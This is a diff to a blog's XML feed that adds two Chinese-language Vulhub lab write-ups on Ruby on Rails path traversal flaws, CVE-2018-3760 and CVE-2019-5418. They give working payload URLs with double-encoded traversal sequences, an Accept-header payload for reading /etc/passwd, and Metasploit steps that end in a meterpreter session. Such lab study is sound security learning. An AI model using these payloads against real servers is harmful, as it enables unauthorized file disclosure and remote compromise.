@@ -4,6 +4,50 @@
   
   
   <entry>
+    <title>Vulhub之 CVE-2018-3760</title>
+    <link href="/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/"/>
+    <url>/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/</url>
+    
+    <content type="html"><![CDATA[<p>先搜一下3760的形成原理：</p><p>Ruby on Rails 路径穿越；</p><p>高危；</p><p>影响版本： 版本&lt;=Sprockets 3.7.1</p><p>Ruby on rails在开发环境下使用Sprockets作为静态文件服务器，在Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用<code>%25e%25e/</code>来跨越到就根目录，读取或执行目标服务器上任意文件。</p><p>Sprockets是一个用于编译和提供Web Assets 的Ruby库。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>目的：利用已知漏洞读取文件passwd。</p><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:///etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/buyhqXf96nOvz7L.png" alt="image.png"></p><p>直接在url后门进行文件包含，<code>/</code>被过滤，换成url编码重新访问试试：</p><pre><code class="hljs">/ 的URL编码为%2fhttp://192.168.218.145:3000/assets/file:%2f%2f/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/Bx4FSePLzYXZ8yR.png" alt="image.png"></p><p>因为<code>/etc/passwd</code>在不允许的目录中，但在报错页面给出了允许的目录列表。</p><p>随意选一个，用<code>.../.../</code>的办法向上跳转读取<code>/etc/passwd</code></p><pre><code class="hljs">" . "  url编码为%2e,二次编码为%252e</code></pre><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/xH7t5konC8ifu9h.png" alt="image.png"></p><p>参考文章</p><p><a href="https://blog.csdn.net/qq_51524329/article/details/121845115">https://blog.csdn.net/qq_51524329/article/details/121845115</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>vulhub</tag>
+      
+      <tag>CVE</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulhub之CVE-2019-5418</title>
+    <link href="/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/"/>
+    <url>/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/</url>
+    
+    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/11/24/ft2X6wep4P39igT.png" alt="image.png"></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Ruby on Rails是一个Web应用程序框架，构建在Ruby语言上。</p><p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。</p><p>通过传入<code>Accept:../../../../../../../etc/passwd\{\{</code> 头来构造路径穿越漏洞，读取任意文件。</p><h2 id="漏洞利用方法一"><a href="#漏洞利用方法一" class="headerlink" title="漏洞利用方法一"></a>漏洞利用方法一</h2><p>访问index.php（随便输入的）报错，报错页面有个<code>robots</code>路径。</p><p><img src="https://s2.loli.net/2022/11/24/ZVbqw63aJUHlmk8.png" alt="image.png"></p><p>访问一下：</p><p><img src="https://s2.loli.net/2022/11/24/8p9YzNMK2vejF64.png" alt="image.png"></p><p>不知道，抓包看看：</p><p><img src="https://s2.loli.net/2022/11/24/XRMlnKUzOFqZjNk.png" alt="image.png"></p><p>修改Accept:</p><p><img src="https://s2.loli.net/2022/11/24/VK1SO7xEFPI2kca.png" alt="image.png"></p><p>成功读取<code>/etc/passwd</code></p><h2 id="漏洞利用方法二"><a href="#漏洞利用方法二" class="headerlink" title="漏洞利用方法二"></a>漏洞利用方法二</h2><p>利用kali中的MSF进行漏洞利用</p><pre><code class="hljs">msfconsole # 启动search rails # 查找rails相关模块use 4 #选择模块</code></pre><p><img src="https://s2.loli.net/2022/11/24/siNFGewlkHa38YM.png" alt="image.png"></p><pre><code class="hljs">show options # 展示配置选项</code></pre><p><img src="https://s2.loli.net/2022/11/24/HUrDNV1AJjtawxq.png" alt="image.png"></p><p>设置Rhost,rport,route参数，直接run运行后成功拿到meterpreter。</p><p><img src="https://s2.loli.net/2022/11/24/Hy1FaMBGNERCZDb.png" alt="image.png"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>vulhub</tag>
+      
+      <tag>CVE</tag>
+      
+      <tag>靶场</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>php学习2</title>
     <link href="/2022/11/23/php%E5%AD%A6%E4%B9%A02/"/>
     <url>/2022/11/23/php%E5%AD%A6%E4%B9%A02/</url>
@@ -184,7 +228,7 @@
       
       <tag>业务渗透</tag>
       
-      <tag>WEB，学习笔记</tag>
+      <tag>WEB,学习笔记</tag>
       
     </tags>
     
